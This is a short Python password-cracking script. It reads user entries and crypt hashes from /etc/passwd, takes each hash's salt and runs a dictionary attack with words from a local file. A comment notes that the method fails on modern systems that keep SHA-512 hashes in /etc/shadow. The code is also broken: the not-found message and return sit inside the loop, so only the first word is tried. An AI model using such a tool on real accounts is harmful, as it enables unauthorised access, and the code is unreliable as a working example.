import crypt

# this program is obsolete in recent unix-like systems
# because passwords are hashed by SHA512 and
# stored in /etc/shadow which is readable only by root

def testPass(cryptPass):
	salt = cryptPass[0:2]
	with open('dictionary.txt') as dictFile:
		for word in dictFile.read().splitlines():
			cryptWord = crypt.crypt(word,salt)
			if (cryptWord == cryptPass):
				print('[+] Found Password: ' + word)
				return
			print('[-] Password Not Found')
			return

def main():
	with open('/etc/passwd') as f:
		for line in f.read().splitlines():
			user = line.split(':')[0]
			cryptPass = line.split(':')[1].strip()
			print('[*] Cracking password for: ' + user)
			testPass(cryptPass)

if __name__ == '__main__':
	main()

